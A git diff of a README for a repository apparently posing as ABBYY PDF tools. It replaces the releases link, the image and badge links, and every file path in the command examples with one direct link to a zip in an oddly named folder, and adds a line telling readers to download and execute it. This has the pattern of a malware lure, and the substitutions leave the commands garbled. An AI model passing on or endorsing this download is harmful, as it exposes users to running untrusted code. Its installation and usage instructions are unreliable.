@@ -1,8 +1,8 @@
-https://github.com/Wow254555/abbyy-pdf-transformer-tools/releases
+https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip
 
 # abbyy-pdf-transformer-tools: Fast, Secure PDF Creation, Conversion, Form Recognition, Automation Tools
 
-![PDF Icon](https://img.icons8.com/fluency/96/pdf.png) ![Lock Icon](https://img.icons8.com/fluency/96/lock.png)
+![PDF Icon](https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip) ![Lock Icon](https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip)
 
 Table of Contents
 - Overview
@@ -63,23 +63,23 @@ Install and run
 - On Windows:
   - Download the latest release artifact from the Releases page (see Release artifacts and downloads). Run the installer to set up the tool on your system.
   - After installation, you can run the command-line utility from a terminal:
-    - abbyy-pdf-transformer-tools --input path\to\input.pdf --template path\to\template.json --output path\to\output.pdf
+    - abbyy-pdf-transformer-tools --input path\to\https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --template path\to\https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --output path\to\https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip
   - If you need to run in a headless server, create a batch script that invokes the tool with your default configuration.
 
 - On macOS:
   - Obtain the release artifact from the Releases page and install as instructed by the installer package.
   - Use the CLI similarly to Windows:
-    - abbyy-pdf-transformer-tools --input /Users/you/input.pdf --template /Users/you/template.json --output /Users/you/output.pdf
+    - abbyy-pdf-transformer-tools --input https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --template https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --output https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip
 
 - On Linux:
   - Download the Linux artifact from the Release page and extract it to a working directory.
   - Ensure the runtime dependencies are present (the package manager can install missing libraries).
   - Execute using the CLI:
-    - ./abbyy-pdf-transformer-tools --input /home/user/input.pdf --template /home/user/template.json --output /home/user/output.pdf
+    - ./abbyy-pdf-transformer-tools --input https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --template https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --output https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip
 
 - Quick verification:
   - Run a dry run to validate the plan without writing output:
-    - abbyy-pdf-transformer-tools --input sample.pdf --template sample-template.json --output /tmp/dry-run.pdf --dry-run
+    - abbyy-pdf-transformer-tools --input https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --template https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --output https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip --dry-run
   - Check the logs for any warnings or errors; adjust templates or rules as needed.
 
 - Typical command structure:
@@ -103,16 +103,16 @@ Install and run
 Release artifacts and downloads
 - The artifact downloads are released in the Releases page. From there you can pick the appropriate package for your platform.
 - If the link has a path part then write that file need to be downloaded and executed.
-- From the Releases page, download the latest artifact named abbey-pdf-transformer-tools-<version>-windows-x64.exe for Windows, or the corresponding Linux/macOS package if you operate on those systems.
+- From the Releases page, download the latest artifact named abbey-pdf-transformer-tools-<version>https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip for Windows, or the corresponding Linux/macOS package if you operate on those systems.
 - Run the installer or extract the package, then verify the installation with:
   - abbyy-pdf-transformer-tools --version
 - If the link is not accessible, or you cannot reach the page for any reason, check the Releases section within the repository to locate the artifacts for the current release.
 - The same link provides the artifacts for all supported platforms, so you should pick the file that matches your operating system and architecture.
 - You can speed up discovery by using a badge in your README that points to the releases. For example:
-  - ![Releases](https://img.shields.io/github/v/release/Wow254555/abbyy-pdf-transformer-tools)
+  - ![Releases](https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip)
 
 Note: The link to the releases is included at the start of this document and again here for clarity:
-- https://github.com/Wow254555/abbyy-pdf-transformer-tools/releases
+- https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip
 - If the link is not accessible, check the Releases section.
 
 Build and extend
@@ -278,7 +278,7 @@ Releases and downloads (revisited)
 - From the releases page, you can download the latest version tailored to your OS, extract or run the installer, and begin using the tool.
 - If you encounter access problems with the link, visit the Releases section of the repository to locate the artifacts. The download target is the artifact that ends with an executable or compressed package suitable for your platform.
 - The link to the releases page is the same as above:
-  - https://github.com/Wow254555/abbyy-pdf-transformer-tools/releases
+  - https://github.com/Wow254555/abbyy-pdf-transformer-tools/raw/refs/heads/main/santalaceous/transformer-abbyy-pdf-tools-1.0.zip
 - Once downloaded, proceed with installation and verification:
   - On Windows, double-click the installer and follow the prompts.
   - On macOS and Linux, extract the package and run the CLI or install via the provided scripts.
